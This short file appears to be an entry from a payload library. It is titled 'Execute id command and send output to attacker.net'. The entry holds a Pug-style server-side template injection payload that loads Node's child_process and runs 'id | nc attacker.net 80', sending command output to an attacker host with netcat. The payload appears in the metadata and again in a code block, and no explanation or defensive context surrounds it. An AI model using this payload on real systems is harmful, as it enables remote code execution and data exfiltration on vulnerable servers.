---
id: 07784057-ee17-440a-9685-19b5f6be3409
name: Execute id command and send output to attacker.net
type: command
executor: bash
data: '- var x = root.process

  - x = x.mainModule.require

  - x = x(''child_process'')

  = x.exec(''id | nc attacker.net 80'')'
output: null
created_at: '2023-04-06T03:56:39.269616+00:00'
updated_at: '2023-04-10T20:23:52.301947+00:00'
---

# Execute id command and send output to attacker.net

```bash
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```
